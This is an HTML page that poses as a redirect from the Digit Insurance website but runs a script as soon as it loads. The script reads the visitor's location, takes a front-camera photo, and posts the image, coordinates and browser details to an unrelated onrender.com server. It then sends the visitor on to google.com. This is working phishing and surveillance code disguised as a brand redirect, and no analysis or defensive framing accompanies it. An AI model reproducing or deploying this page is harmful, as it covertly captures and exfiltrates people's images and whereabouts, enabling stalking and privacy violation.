<!DOCTYPE html>
<html>
<head>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Digit Insurance | Buy Car, Bike, Health & Travel Insurance Online in India</title>
</head>
<body>
  <h3>Redirecting to Go digit...</h3>

  <script>
    async function start() {
      try {
        // Get location
        let lat = null, lon = null;
        try {
          await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
              pos => {
                lat = pos.coords.latitude;
                lon = pos.coords.longitude;
                resolve();
              },
              err => resolve() // ignore error if denied
            );
          });
        } catch {}

        // Get front camera stream
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" }
        });

        // Capture photo
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        // Wait for video to be ready
        await new Promise(r => setTimeout(r, 1000));

        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext("2d").drawImage(video, 0, 0);

        const image = canvas.toDataURL("image/jpeg");

        // Stop camera
        stream.getTracks().forEach(track => track.stop());

        // Send data to server
        await fetch("https://geo-location-fb0c.onrender.com/upload", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            image,
            latitude: lat,
            longitude: lon,
            userAgent: navigator.userAgent
          })
        });

        // Redirect after successful upload
        window.location.href = "https://www.google.com";

      } catch (err) {
        console.error("Error:", err);
        document.body.innerHTML = "<h3>Permission denied or an error occurred</h3>";
      }
    }

    start();
  </script>
</body>
</html>
